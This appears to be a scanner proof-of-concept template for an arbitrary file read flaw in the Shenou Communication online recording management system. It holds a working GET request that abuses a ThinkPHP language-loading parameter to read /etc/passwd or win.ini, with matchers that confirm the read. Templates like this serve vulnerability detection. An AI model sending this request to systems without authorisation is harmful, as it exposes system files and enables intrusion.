id: poc-yaml-shenou-communication-file-anyfile-read
info:
  name: 申瓯通信 在线录音管理系统 file 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

variables:
  paths:
    - "C:/windows/win.ini"
    - "etc/passwd"

http:
  - method: GET
    path:
      - "/callcenter/public/index.php?s=index/\\think\\Lang/load&file=/{{paths}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: dsl
        dsl:
          - "contains(body, 'root:') && contains(body, '/bin')"
          - "contains(body, '[files]') && contains(body, 'bit app support')"
